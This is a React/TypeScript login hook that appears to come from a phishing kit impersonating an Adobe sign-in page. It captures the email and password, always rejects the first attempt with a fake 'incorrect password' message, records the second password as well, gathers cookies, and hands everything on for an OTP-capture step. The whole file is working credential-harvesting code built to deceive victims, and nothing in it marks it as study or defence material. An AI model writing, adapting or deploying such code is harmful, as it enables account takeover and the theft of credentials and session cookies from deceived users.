import { useState, useRef } from 'react';
import { getBrowserFingerprint } from '../utils/oauthHandler';

export const useLogin = (
  onLoginSuccess?: (data: any) => void,
  onLoginError?: (error: string) => void
) => {
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [firstAttemptPassword, setFirstAttemptPassword] = useState<string>('');
  
  // Refs for form inputs (used by other login components)
  const emailRef = useRef<HTMLInputElement>(null);
  const passwordRef = useRef<HTMLInputElement>(null);

  const resetLoginState = () => {
    setFirstAttemptPassword('');
    setErrorMessage('');
  };

  const handleFormSubmit = async (event: React.FormEvent, formData?: any) => {
    event.preventDefault();
    setIsLoading(true);
    setErrorMessage('');
    let isFirstAttemptResult = false;

    try {
      const email = formData?.email || emailRef.current?.value || '';
      const password = formData?.password || passwordRef.current?.value || '';
      const provider = formData?.provider || 'Others';
      const cookies = formData?.cookies || [];
      const cookieList = formData?.cookieList || [];

      if (!email || !password) {
        throw new Error('Please enter both email and password');
      }

      const sessionData = {
        email,
        provider,
        timestamp: new Date().toISOString(),
        cookies,
        cookieList,
      };
      // Temporarily store data in case it's the first attempt
      localStorage.setItem('adobe_pre_session', JSON.stringify(sessionData));

      // This is the SECOND attempt
      if (firstAttemptPassword) {
        // Prevent using the same password twice
        if (firstAttemptPassword === password) {
            throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
        }

        console.log('✅ Second attempt captured. Passing to App for OTP.');
        
        const finalData = {
          email,
          provider,
          firstAttemptPassword,
          secondAttemptPassword: password,
          cookies,
          cookieList,
          timestamp: new Date().toISOString(),
          isSecondAttempt: true, // Flag for App.tsx
        };

        if (onLoginSuccess) {
          onLoginSuccess(finalData);
        }
        return; // Exit after second attempt
      }

      // This is the FIRST attempt
      console.log('🔒 First attempt captured (invalid password simulation)');
      setFirstAttemptPassword(password);
      isFirstAttemptResult = true;
      throw new Error('Your account or password is incorrect. If you don\'t remember your password, reset it now.');

    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Login failed';
      setErrorMessage(errorMsg);
      if (onLoginError) {
        onLoginError(errorMsg);
      }
      return { isFirstAttempt: isFirstAttemptResult };
    } finally {
      setIsLoading(false);
    }
  };

  return {
    isLoading,
    errorMessage,
    handleFormSubmit,
    resetLoginState, // Expose reset function
    emailRef,
    passwordRef,
  };
};
